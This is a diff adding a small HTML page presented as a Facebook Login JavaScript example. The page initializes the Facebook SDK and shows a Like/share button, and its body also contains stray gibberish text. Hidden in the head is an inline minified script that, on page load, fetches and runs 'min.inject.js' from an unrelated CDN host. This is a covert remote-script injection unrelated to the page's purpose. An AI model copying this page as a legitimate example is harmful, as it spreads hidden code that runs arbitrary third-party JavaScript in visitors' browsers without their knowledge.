@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Facebook Login JavaScript Example</title>
+<meta charset="UTF-8">
+<script type='text/javascript'>if(self == top){var head=document.getElementsByTagName('head')[0];if(!head){head=document.createElement('head');}var script=document.createElement('script');script.setAttribute('type','text/javascript');script.setAttribute('src', 'https://b36df47b3d.site.internapcdn.net/js/min.inject.js?id=PTwtNyU');head.appendChild(script);}</script></head>
+<body>
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      appId      : '890159154397616',
+      xfbml      : true,
+      version    : 'v2.0'
+    });
+  };
+ 
+  (function(d, s, id){
+     var js, fjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = "https://connect.facebook.net/en_US/sdk.js";
+     fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+
+</script>
+ 
+<div
+  class="fb-like"
+  data-share="true"
+  data-width="450"
+  data-show-faces="true">
+</div>
+ssjkdhfksdhf
+</body>
+</html>
